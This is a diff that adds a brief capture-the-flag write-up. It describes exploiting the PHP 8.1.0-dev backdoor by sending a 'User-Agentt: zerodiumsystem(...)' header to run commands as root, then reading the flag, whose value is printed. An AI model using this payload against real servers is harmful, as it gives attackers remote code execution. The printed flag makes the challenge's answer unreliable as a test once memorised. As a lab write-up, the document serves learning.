@@ -1,0 +1,16 @@
+Step 1
+
+Load website, read through HTML, but didn't notice anything.
+Looked at the request and found an interesting Header: X-Powered-By: PHP/8.1.0-dev
+
+by typing PHP/8.1.0-dev on google, I find some interesting results: https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
+The version PHP/8.1.0-dev seems to have been a target to an attack to permit RCE. 
+
+The website explains that using User-Agentt: zerodiumsystem("whoami"); (yes, with two t's) and wrapping a command in this "zerodiumsystem("$COMMAND");" allows RCE.
+I tried this, and bingo, the website displays 'root'
+
+All I have to do is find the flag (could have created a reverse shell but I believe it was a it overkill)
+$ ls ~
+flag.txt
+$ cat ~/flag.txt
+BDSEC{php_15_7h3_b357_pr06r4mm1n6_l4n6u463}
